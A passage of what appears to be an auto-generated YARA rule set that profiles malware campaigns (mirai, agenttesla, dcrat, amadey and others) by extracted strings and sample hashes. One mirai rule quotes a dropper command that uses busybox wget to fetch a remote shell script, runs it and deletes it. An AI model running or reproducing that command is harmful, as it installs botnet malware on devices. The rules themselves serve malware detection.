        $s5 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s6 = "BaoCaoNMCNPM_KARAOKE.form_DangNhap.resources" ascii
        $s7 = "BaoCaoNMCNPM_KARAOKE.frm_phong.resources" ascii
        $s8 = "BaoCaoNMCNPM_KARAOKE.frm_nhanVien.resources" ascii
        $s9 = "select count(*) from PHONG where MAPHONG='" wide
        $s10 = "BaoCaoNMCNPM_KARAOKE.fm_thanhToan.resources" ascii
        $s11 = "select count(*) from TAIKHOAN where username='" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 1690624 and 12 of them
}

rule Sightlines_tlsh_734d178f_ironrat
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-734d178f"
        date = "2026-10-27"
        campaign = "tlsh-734d178f"
        family = "ironrat"
        hash = "47a9e572a1062abd16b0a0df256ba0c4b6b4660125844ca8ddbf22714f6beb30"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-734d178f.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "2024-08-13 09:16:08 c9c2ab54ba1f5f46360f1b4f35d849cd3f080e6fc2b6c60e91b16c63f69a1e33" ascii
        $s1 = "WinHttpQueryDataAvailable" ascii
        $s2 = ".?AVGdiplusBase@Gdiplus@@" ascii
        $s3 = "internal query planner error" ascii
        $s4 = ".?AVBitmap@Gdiplus@@" ascii
        $s5 = ".?AVImage@Gdiplus@@" ascii
        $s6 = "WinHttpReceiveResponse" ascii
        $s7 = "WinHttpQueryHeaders" ascii
        $s8 = "WinHttpSendRequest" ascii
        $s9 = "WinHttpOpenRequest" ascii
        $s10 = "WinHttpReadData" ascii
        $s11 = "WinHttpConnect" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 3369374 and 12 of them
}

rule Sightlines_tlsh_7cad1b00_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-7cad1b00"
        date = "2026-10-27"
        campaign = "tlsh-7cad1b00"
        family = "mirai"
        hash = "0be273779ab4cc6cebd141822b211480e1769bc8bb3b66e8b9c94a2b511687d2"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-7cad1b00.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "__linuxthreads_initial_report_events" ascii
        $s1 = "__GI_pthread_attr_getschedpolicy" ascii
        $s2 = "__GI_pthread_attr_setschedpolicy" ascii
        $s3 = "__pthread_wait_for_restart_signal" ascii
        $s4 = "__GI_pthread_attr_getinheritsched" ascii
        $s5 = "__GI___rpc_thread_svc_max_pollfd" ascii
        $s6 = "__stdio_mutex_initializer.3828" ascii
        $s7 = "__GI_pthread_attr_setinheritsched" ascii
        $s8 = "pthread_cond_timedwait_relative" ascii
        $s9 = "__pthread_kill_other_threads_np" ascii
        $s10 = "__GI_pthread_attr_getschedparam" ascii
        $s11 = "__pthread_set_own_extricate_if" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_b1057809_agenttesla
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-b1057809"
        date = "2026-10-27"
        campaign = "tlsh-b1057809"
        family = "agenttesla"
        hash = "57da55faa7b7923b893fa16d6352698a996410f17c84c3e07c9cbcdc33a2f3af"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-b1057809.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "TY':'Division\\x20by\\x20zero\\x20exception\\x20flag.'" ascii
        $s1 = "Y':'Invalid\\x20operation\\x20exception\\x20flag.'" ascii
        $s2 = "uction\\x20is\\x20always\\x20atomic,\\x20regardless\\x20of\\x20use\\x20of\\x20the\\x20LOCK\\x20prefix.'" ascii
        $s3 = "0used\\x20with\\x20REPNE\\x20(REPNZ)\\x20prefix.'" ascii
        $s4 = "sed\\x20with\\x20REP\\x20(REPE/REPZ)\\x20prefix.'" ascii
        $s5 = "':'Lost\\x20of\\x20precision\\x20exception\\x20flag.'" ascii
        $s6 = ":'Dernormalized\\x20exception\\x20flag.'" ascii
        $s7 = "20used\\x20to\\x20end\\x20lock\\x20elision\\x20on\\x20the\\x20instruction\\x20memory\\x20operand\\x20address.'" ascii
        $s8 = "20used\\x20to\\x20start\\x20lock\\x20elision\\x20on\\x20the\\x20instruction\\x20memory\\x20operand\\x20address" ascii
        $s9 = "prefix\\x20can\\x20be\\x20used,\\x20but\\x20has\\x20no\\x20effect.'" ascii
        $s10 = "\\x20used\\x20to\\x20start\\x20lock\\x20elision\\x20on\\x20the\\x20instruction\\x20memory\\x20operand\\x20addre" ascii
        $s11 = "\\x20used\\x20to\\x20end\\x20lock\\x20elision\\x20on\\x20the\\x20instruction\\x20memory\\x20operand\\x20address" ascii
    condition:
        filesize < 8258822 and 12 of them
}

rule Sightlines_imphash_795eb4ac_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-795eb4ac"
        date = "2026-10-27"
        campaign = "imphash-795eb4ac"
        family = ""
        hash = "2548b7c1bda26e55dca101f8cfc781dbc6b5dba7eb7f3fafc5f968d468570502"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-795eb4ac.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "CHUNK_SIZE_MAX_BYTES should fit any usizeC:\\Users\\it\\.cargo\\registry\\src\\index.crates.io-1949cf8c6b5" ascii
        $s1 = "invalid WINDOW_UPDATE frameC:\\Users\\it\\.cargo\\registry\\src\\index.crates.io-1949cf8c6b5b557f\\h2-0.4.1" ascii
        $s2 = "ed: size <= proto::MAX_WINDOW_SIZEC:\\Users\\it\\.cargo\\registry\\src\\index.crates.io-1949cf8c6b5b557f\\h" ascii
        $s3 = "RUST_BACKTRACE\\...lock count overflow in reentrant mutex/rustc/8bab26f4f68e0e26f0bb7960be334d5b520ea" ascii
        $s4 = "invalid RST_STREAM frameC:\\Users\\it\\.cargo\\registry\\src\\index.crates.io-1949cf8c6b5b557f\\h2-0.4.15\\s" ascii
        $s5 = "size overflows MAX_SIZEC:\\Users\\it\\.cargo\\registry\\src\\index.crates.io-1949cf8c6b5b557f\\http-1.4.2\\s" ascii
        $s6 = "b9mspwefOV2NSHH8+NzBZbhnddgeYCJRnQtPZpQMHUg= " ascii
        $s7 = "invalid GOAWAY frameC:\\Users\\it\\.cargo\\registry\\src\\index.crates.io-1949cf8c6b5b557f\\h2-0.4.15\\src\\p" ascii
        $s8 = "StreamIdConnTask Future polled twiceC:\\Users\\it\\.cargo\\registry\\src\\index.crates.io-1949cf8c6b5b557f" ascii
        $s9 = "Previous URL must be validC:\\Users\\it\\.cargo\\registry\\src\\index.crates.io-1949cf8c6b5b557f\\reqwest-0" ascii
        $s10 = "\" -fn() ->  + : punycode{}.llvm./rust/deps\\rustc-demangle-0.1.27\\src\\lib.rs" ascii
        $s11 = "Errassertion failed: buf.len() <= u32::MAX as usize/rustc/8bab26f4f68e0e26f0bb7960be334d5b520ea452/l" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 5844144 and 12 of them
}

rule Sightlines_rich_header_hash_6c4faeba_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign rich_header_hash-6c4faeba"
        date = "2026-10-27"
        campaign = "rich_header_hash-6c4faeba"
        family = ""
        hash = "086502fbbc7b0817f1371e363774201a641a98ea465589495f686cb26c0b5682"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/rich_header_hash-6c4faeba.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "10.0.20348.1 (WinBuild.160101.0800)" wide
        $s1 = "`0a1b2c3d4e5f6g7h8i9" wide
        $s2 = "KbdLayerDescriptor" ascii
        $s3 = "Right Windows" wide
        $s4 = "Left Windows" wide
        $s5 = "QWERTYUIOP" wide
        $s6 = "Right Shift" wide
        $s7 = "Scroll Lock" wide
        $s8 = "ASDFGHJKL" wide
        $s9 = "Caps Lock" wide
        $s10 = "Num Enter" wide
        $s11 = "Page Down" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 3 of them
}

rule Sightlines_signer_cert_sha1_19c43e7e_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign signer_cert_sha1-19c43e7e"
        date = "2026-10-27"
        campaign = "signer_cert_sha1-19c43e7e"
        family = ""
        hash = "09499e186cf0e434ffa17ad153aa9a66d6048c54a2c03b823e2a06c49d9affe4"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/signer_cert_sha1-19c43e7e.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "_http://www.microsoft.com/pkiops/crl/Microsoft%20ID%20Verified%20Code%20Signing%20PCA%202021.crl0}" ascii
        $s1 = "ahttp://www.microsoft.com/pkiops/certs/Microsoft%20ID%20Verified%20Code%20Signing%20PCA%202021.crt0" ascii
        $s2 = "Copyright 1998-2026 The OpenSSL Authors. All rights reserved." wide
        $s3 = "Xhttp://www.microsoft.com/pkiops/certs/Microsoft%20ID%20Verified%20CS%20AOC%20CA%2003.crt0T" ascii
        $s4 = "Vhttp://www.microsoft.com/pkiops/crl/Microsoft%20ID%20Verified%20CS%20AOC%20CA%2003.crl0t" ascii
        $s5 = "\"Microsoft ID Verified CS AOC CA 030" ascii
        $s6 = "260611073243Z0|1" ascii
        $s7 = "310326181132Z0Z1" ascii
        $s8 = "260608073243Z" ascii
        $s9 = "260326181132Z" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 10477040 and 10 of them
}

rule Sightlines_tlsh_5b7aa1cb_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-5b7aa1cb"
        date = "2026-10-26"
        campaign = "tlsh-5b7aa1cb"
        family = "mirai"
        hash = "0a2d1fe2f32d8c6f1adb5ffe9c767037c47870ffdff54373dfa7d6d0e9712cc6"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-5b7aa1cb.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,diffie-hellman-" ascii
        $s1 = "mig.sh http://$H/bins/kla.sh 2>/dev/null ||    busybox wget -q -O .mig.sh http://$H/bins/kla.sh 2>/d" ascii
        $s2 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s3 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s4 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" ascii
        $s5 = "chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@ope" ascii
        $s6 = "group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group14-sha256" ascii
        $s7 = "text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8" ascii
        $s8 = "GCC: (GNU) 3.3.2 20031005 (Debian prerelease)" ascii
        $s9 = "en sh .mig.sh 2>/dev/null; rm -f .mig.sh 2>/dev/null; break; fi; done; rm -f .mig.sh 2>/dev/null" ascii
        $s10 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/ieee754-df.S" ascii
        $s11 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/lib1funcs.asm" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 3 of them
}

rule Sightlines_imphash_74297425_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-74297425"
        date = "2026-10-26"
        campaign = "imphash-74297425"
        family = ""
        hash = "9ddb5cfa4a64771fbed9b74c1bba90c9e84d1d24d5cb56ed2e3472b17f59cb37"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-74297425.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "INSERT INTO %s.sqlite_schema SELECT*FROM \"%w\".sqlite_schema WHERE type IN('view','trigger') OR(type=" ascii
        $s1 = "SELECT'INSERT INTO %s.'||quote(name)||' SELECT*FROM\"%w\".'||quote(name)FROM %s.sqlite_schema WHERE ty" ascii
        $s2 = ".?AV?$_Func_impl_no_alloc@V<lambda_1>@?2??pack_pkg_to_buffer@@YA_NAEBV?$basic_string@DU?$char_traits" ascii
        $s3 = ".?AV?$_Func_impl_no_alloc@V<lambda_1>@?2??run_vs_projects_scan@@YAXAEBV?$basic_string@DU?$char_trait" ascii
        $s4 = ".?AV<lambda_1>@?2??pack_pkg_to_buffer@@YA_NAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@" ascii
        $s5 = ".?AV<lambda_1>@?2??run_vs_projects_scan@@YAXAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D" ascii
        $s6 = ".?AV?$_Func_impl_no_alloc@P6A_NAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z_N" ascii
        $s7 = ".?AV?$_Ref_count_obj2@$$CBUStubRuntimeDetail@@@std@@" ascii
        $s8 = "2@@std@@AEBUPkgMeta@@0AEBV?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@s" ascii
        $s9 = ".?AV?$_Func_base@XAEAV?$basic_json@Vmap@std@@Vvector@2@V?$basic_string@DU?$char_traits@D@std@@V?$all" ascii
        $s10 = "@D@std@@V?$allocator@D@2@@std@@AEBUPkgMeta@@0AEBV?$unordered_map@V?$basic_string@DU?$char_traits@D@s" ascii
        $s11 = ".?AU?$output_adapter_protocol@D@detail@json_abi_v3_12_0@nlohmann@@" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 6652928 and 12 of them
}

rule Sightlines_tlsh_77fef818_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-77fef818"
        date = "2026-10-25"
        campaign = "tlsh-77fef818"
        family = ""
        hash = "21b26e4435c0c6d8212ed91a5e70c13710d41faf912474d2d17ef21fa13ab361"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-77fef818.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "if ([System.Environment]::Is64BitProcess)" ascii
        $s1 = "[System.IO.Pipes.PipeOptions]::None);" ascii
        $s2 = "[Parameter( Position = 1 )]" ascii
        $s3 = "[Parameter( Position = 0)]" ascii
        $s4 = "[OutputType([Type])]" ascii
        $s5 = "return $false;" ascii
        $s6 = "return $null;" ascii
        $s7 = "} finally {" ascii
        $s8 = "    return" ascii
        $s9 = "catch {}" ascii
    condition:
        filesize < 1274118 and 10 of them
}

rule Sightlines_tlsh_98e7b6a1_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-98e7b6a1"
        date = "2026-10-26"
        campaign = "tlsh-98e7b6a1"
        family = ""
        hash = "2a6e2516b103c2f313d280e2e5954db9111515e401e603ebb6d4b47a65b086fb"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-98e7b6a1.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "            \"user\": \"85GCqQjDYqpBZzwm3qSj6EgmzngJ1qGJeRZ1qU8dQeq9KuKxJwjDUq77hSaLLx13b9Ndkz8GaSxpnYV" ascii
        $s1 = "llocmWcpuprofallocmRgctraceIO waitrunningforevernetworkUNKNOWN:eventsgc bitsGODEBUG19531259765625con" ascii
        $s2 = "yearyokezincPWD=PATHquitboolint8chanfunccall on allgallpitabsbrk is LEAFheap) = GOGC+Inf-Infcas1cas2" ascii
        $s3 = "ytubusevanwarwaxwayyakyamzooEOFmap...finobjNaN125625cgodnsudpftpssh::1setHanLaoMroNkoVaiadxaesshaavx" ascii
        $s4 = "$Id: UPX 3.96 Copyright (C) 1996-2020 the UPX Team. All Rights Reserved. $" ascii
        $s5 = "etDebugLog (test)chan send (nil chan)flushing proc cachesSIGALRM: alarm clockSIGTERM: termination__v" ascii
        $s6 = "x509negativeserialstrongFromWeakQueueGC mark terminationsync.WaitGroup.Waitchan send (durable)SIGTRA" ascii
        $s7 = "l mapSIGUSR1: user-defined signal 1SIGUSR2: user-defined signal 2SIGVTALRM: virtual alarm clockSIGPR" ascii
        $s8 = "IGCHLD: child status has changedSIGTTIN: background read from ttySIGXFSZ: file size limit exceededmi" ascii
        $s9 = "StringFormat[]byte[vfsd].scope/proc/TMPDIRrenameremovewaitidspliceSundayMondayFridayAugustminuteseco" ascii
        $s10 = "lsevaluefloat  -%s<nil>Errorchdirwritemkdir$HOMEchmodlstatlinuxclosegetwdpipe2MarchAprilmonthLocalab" ascii
        $s11 = "o long: invalid path escape sequencesync.WaitGroup.Wait (durable)SIGPIPE: write to broken pipeSIGPWR" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 18548096 and 12 of them
}

rule Sightlines_imphash_98b9d99e_dcrat
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-98b9d99e"
        date = "2026-10-26"
        campaign = "imphash-98b9d99e"
        family = "dcrat"
        hash = "10ff3c82edf92620726c77b368918b64f0744c2cf3cb422279d43cb539fa5cec"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-98b9d99e.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "-,43537698;:BAFEGEHEIEJELKMLNKOKQPUTWVXVYVZV[V]\\^\\_\\`\\baedfegdhgigjgkglgmdnmodpdqdrdsdutwvyxzx{x|x~}" wide
        $s1 = "  <asmv3:windowsSettings xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">" ascii
        $s2 = "<style>body{font-family:\"Arial\";font-size:12;}</style>" wide
        $s3 = "<compatibility xmlns=\"urn:schemas-microsoft-com:compatibility.v1\">" ascii
        $s4 = "D:\\Projects\\WinRAR\\sfx\\build\\sfxrar32\\Release\\sfxrar.pdb" ascii
        $s5 = "    <!--The ID below indicates application support for Windows 8.1 -->" ascii
        $s6 = "<asmv3:application xmlns:asmv3=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s7 = "<description>WinRAR SFX module</description>" ascii
        $s8 = "    <!--The ID below indicates application support for Windows 10 -->" ascii
        $s9 = "manually.</li><br><br>8<li>If the destination folder does not exist, it will be" wide
        $s10 = "    <!--The ID below indicates application support for Windows 7 -->" ascii
        $s11 = "    <!--The ID below indicates application support for Windows 8 -->" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 2434310 and 12 of them
}

rule Sightlines_tlsh_fa4b622d_amadey
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-fa4b622d"
        date = "2026-10-26"
        campaign = "tlsh-fa4b622d"
        family = "amadey"
        hash = "04ef642ea5f51c774c5f879827f989c5070efd2767c4d7d4022b1111ac6f7a94"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-fa4b622d.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = ".?AV?$_Fake_no_copy_callable_adapter@A6GXPAUConnexionDetails@@@ZAAPAU1@@std@@" ascii
        $s1 = ".?AV?$_ExceptionPtr_static@Vbad_alloc@std@@@?A0xb4bb966e@@" ascii
        $s2 = ".?AV<lambda_9de88c4009318ef1202283857f94e673>@@" ascii
        $s3 = ".?AV?$_ExceptionPtr_static@Vbad_exception@std@@@?A0xb4bb966e@@" ascii
        $s4 = ".?AV<lambda_cf64729cb90f65090849ddab3f3d5e68>@@" ascii
        $s5 = "powershell -Command Expand-Archive -Path '" ascii
        $s6 = ".?AV_ExceptionPtr_normal@?A0xb4bb966e@@" ascii
        $s7 = ".?AV<lambda_5e5ab22ea98f4361dbf159481d01f54d>@@" ascii
        $s8 = ".?AVstl_condition_variable_win7@details@Concurrency@@" ascii
        $s9 = ".?AV<lambda_eb87dfd73f857f44e1a351ea42ce2b34>@@" ascii
        $s10 = ".?AV<lambda_0456396a71e3abd88ede77bdd2823d8e>@@" ascii
        $s11 = ".?AVstl_condition_variable_vista@details@Concurrency@@" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_c2_2a4c55be_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign c2-2a4c55be"
        date = "2026-10-26"
        campaign = "c2-2a4c55be"
        family = "mirai"
        hash = "297aa3aff9848624c6b4b0b3411ade22f860671e84a8a1aaf2fb8983f968fb63"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/c2-2a4c55be.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "WARNING: Unsupported flag value(s) of 0x%x in DT_FLAGS_1." ascii
        $s1 = "WARNING: ld.so: invalid GLIBC_TUNABLES value `%.*s' for option `%s': ignored." ascii
        $s2 = "ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT" ascii
        $s3 = "((unsigned long) chunk2mem (brk) & MALLOC_ALIGN_MASK) == 0" ascii
        $s4 = "WARNING: ld.so: invalid GLIBC_TUNABLES `%s': ignored." ascii
        $s5 = "info[DT_RELRENT]->d_un.d_val == sizeof (ElfW(Relr))" ascii
        $s6 = "version == NULL || !(flags & DL_LOOKUP_RETURN_NEWEST)" ascii
        $s7 = "(char *) chunk2mem (p) + 2 * CHUNK_HDR_SZ <= paligned_mem" ascii
        $s8 = "chunksize_nomask (p) == (0 | PREV_INUSE)" ascii
        $s9 = "robust || (oldval & FUTEX_OWNER_DIED) == 0" ascii
        $s10 = "lead_zero <= (base == 16 ? ((uintmax_t) exponent - (uintmax_t) INTMAX_MIN) / 4 : ((uintmax_t) expone" ascii
        $s11 = "e != EDEADLK || (kind != PTHREAD_MUTEX_ERRORCHECK_NP && kind != PTHREAD_MUTEX_RECURSIVE_NP)" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1849952 and 11 of them
}

rule Sightlines_tlsh_95091757_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-95091757"
        date = "2026-10-25"
        campaign = "tlsh-95091757"
        family = ""
        hash = "00436a440caaf87f038abf67f023658b8e17be98ded878fe0bc24a5d47bddbd8"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-95091757.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Set Size Exceeded.*Error on call Winsock2 library function %s&Error on loading Winsock2 library (%s)" wide
        $s1 = "Bits index out of range*Can't write to a read-only resource streamECheckSynchronize called from thre" wide
        $s2 = "List index out of bounds (%d)+Out of memory while expanding memory stream" wide
        $s3 = "%s5Could not convert variant of type (%s) into type (%s)=Overflow while converting variant of type (" wide
        $s4 = "Invalid property value List capacity out of bounds (%d)" wide
        $s5 = "No help found for %s#No context-sensitive help installed$No topic-based help system installed" wide
        $s6 = "System\\CurrentControlSet\\Control\\Keyboard Layouts\\%.8x" ascii
        $s7 = "%s.Seek not implemented$Operation not allowed on sorted list$%s not in a class registration group" wide
        $s8 = "Invalid stream format$''%s'' is not a valid component name" wide
        $s9 = "Invalid variant operation%Invalid variant operation (%s%.8x)" wide
        $s10 = " - Dock zone has no control\"Unable to find a Table of Contents" wide
        $s11 = "l16 tI6(lA60TY68LQ6@Ti6HLa6P4y6X,q6`4" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1327648 and 12 of them
}

rule Sightlines_tlsh_dc4aa812_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-dc4aa812"
        date = "2026-10-25"
        campaign = "tlsh-dc4aa812"
        family = ""
        hash = "0087739da28e1f670edb454af547a3153507bd0fa5ebeb019892b2c660bbaedb"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-dc4aa812.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "dgdgfe`c`cba\\_\\_^]X[X[ZYTWTWVUPSPSRQLOLONMHKHKJIDGDGFE@C@CBA<?<?>=8;8;:9474765030321,/,/.-(+(+*)$'$'" ascii
        $s1 = "@Srqpmlkhgfcba_^][ZYWVUSRQONMKJIHGFEDCA@?=<;987543210/.-+*)'&%#\"!" ascii
        $s2 = "Cannot load `vkGetInstanceProcAddr` symbol from libraryPIPELINECOMMAND_BUFFERRENDER_PASSNOT_READYINS" ascii
        $s3 = "  gl_Position = vec4(TRIANGLE_POS[gl_VertexID], 0.0, 1.0);" ascii
        $s4 = ". As the device does not support `DownlevelFlags::BUFFER_BINDINGS_NOT_16_BYTE_ALIGNED`, the type mus" ascii
        $s5 = "urred, due to an implementation or application bugUNDEFINEDR4G4_UNORM_PACK8R4G4B4A4_UNORM_PACK16B4G4" ascii
        $s6 = "ed.HackRegularSourceFoundry: Hack: 2018Hack RegularVersion 3.003;[3114f1256]-release; ttfautohint (v" wide
        $s7 = "8 is not aligned to block size or `COPY_BUFFER_ALIGNMENT`" ascii
        $s8 = "DEVICEDESCRIPTOR_BUFFER_CAPTURE_REPLAY_EXTDESCRIPTOR_SETCommand completed successfullyA fence or que" ascii
        $s9 = "Punycode overflows should not be possible due to PUNYCODE_ENCODE_MAX_INPUT_LENGTH" ascii
        $s10 = "#(emptyvulkanmetaldx12glwebgpuREDGREENBLUEALPHACOLORALL" ascii
        $s11 = "v samples are supported by this format. With the TEXTURE_ADAPTER_SPECIFIC_FORMAT_FEATURES feature yo" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 22767616 and 5 of them
}

rule Sightlines_contacted_0ef593f6_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign contacted-0ef593f6"
        date = "2026-10-31"
        campaign = "contacted-0ef593f6"
        family = ""
        hash = "2bdd795ab5ffd8a9f25c512e812ca604091229688eb114ae3be5796197dcb015"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/contacted-0ef593f6.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "$Id: UPX 3.96 Copyright (C) 1996-2020 the UPX Team. All Rights Reserved. $" ascii
        $s1 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $" ascii
        $s2 = "GCC: (GNU) 4.8.5 20150623(Red" ascii
        $s3 = "PROT_EXEC|PROT_WRITE failed." ascii
        $s4 = "(`& hIlxRr$/iIO" ascii
        $s5 = "build-id%ABI-Pg" ascii
        $s6 = "5#>CQ;t 2U01UJ" ascii
        $s7 = "mCg6YD|Y\\C]UNK" ascii
        $s8 = "runtime/cgo: " ascii
        $s9 = "amdhsa.kernels" ascii
        $s10 = "&-8P Tc58H0bk" ascii
        $s11 = "x86_rd-(void)" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 18489600 and 12 of them
}

rule Sightlines_contacted_4177f74e_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign contacted-4177f74e"
        date = "2026-11-01"
        campaign = "contacted-4177f74e"
        family = "mirai"
        hash = "3f8028b2d52bab13a15d815a82cc8b8447187d6b2d28fa31a874d66cac429c2d"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/contacted-4177f74e.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "r\\8Tl$lp$8W_" ascii
        $s1 = "++wU3UD3\"\"" ascii
        $s2 = "<wQ\"B?TA" ascii
        $s3 = "lXa\\x}6T" ascii
        $s4 = "rj<s.yN>" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 24430912 and 5 of them
}

rule Sightlines_imphash_15c59c97_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-15c59c97"
        date = "2026-10-24"
        campaign = "imphash-15c59c97"
        family = ""
        hash = "052a2258a185f4c858326ff1a5754b2c4c2bf680c12ebf30a3c2b2b9c1af8f68"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-15c59c97.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "host.UI.RawUI.BufferSize = new-object System.Management.Automation.Host.Size(1024,50);\" \"&\"\"%s\"\"\" 2>" wide
        $s1 = ".?AV<lambda_1>@?1??OnPropChanged@WinRTControlBase@@AAE_NABVEvent@exui@@@Z@" ascii
        $s2 = ".?AV<lambda_1>@?1??UpdateFromProperty@ComboBoxControlWinRT@@UAE_NXZ@" ascii
        $s3 = "Caphyon\\Advanced Installer\\[ProductCode]\\[AI_EXTERNALUIUNINSTALLERNAME]" wide
        $s4 = ".?AV<lambda_1>@?1??UpdateWindowText@TextControlWinRT@@UAEXABV?$basic_string@_WU?$char_traits@_W@std@" ascii
        $s5 = ".?AV<lambda_1>@?1??InitControl@CheckBoxControlWinRT@@UAEXXZ@" ascii
        $s6 = ".?AV<lambda_1>@?1??SetAsDefaultButton@ImageButtonControlWinRT@@EAE_N_N@Z@" ascii
        $s7 = ".?AV<lambda_1>@?1??SetAsDefaultButton@PushButtonControlWinRT@@EAE_N_N@Z@" ascii
        $s8 = ".?AV<lambda_1>@?6??OnDdx@WinRTControlBase@@AAE_NABVEvent@exui@@@Z@" ascii
        $s9 = ".?AV<lambda_1>@?1??ShowControl@WinRTControlBase@@UAEX_N@Z@" ascii
        $s10 = ".?AV<lambda_1>@?1??DoSaveData@ComboBoxControlWinRT@@UAE_NXZ@" ascii
        $s11 = ".?AV<lambda_1>@?1??SetPos@ProgressBarWinRT@@UAEXI@Z@" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 27452032 and 12 of them
}

rule Sightlines_tlsh_5d3c973c_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
